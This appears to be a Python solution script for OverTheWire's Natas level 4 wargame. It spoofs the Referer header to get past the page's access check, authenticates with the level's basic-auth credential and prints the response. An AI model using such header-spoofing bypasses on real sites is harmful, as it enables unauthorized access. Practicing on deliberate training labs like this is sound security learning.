
#import urllib2
#req = urllib2.Request('http://natas5.natas.labs.overthewire.org/')
#req.add_header('Referer', 'http://natas4.natas.labs.overthewire.org/')
#resp = urllib2.urlopen(req)
#content = resp.read()

from requests.auth import HTTPBasicAuth
import requests
url = 'http://natas4.natas.labs.overthewire.org/index.php'
my_referer = 'http://natas5.natas.labs.overthewire.org/'
#payload = {'user':'natas4','password':'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZatas4'}
r = requests.get(url, headers={'referer': my_referer},auth=HTTPBasicAuth('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'))
print r.text
print r.status_code
for x in r.headers:
	print x + ':' + r.headers[x]
for x in r.history:
	print str(x.status_code) + ':' + x.url
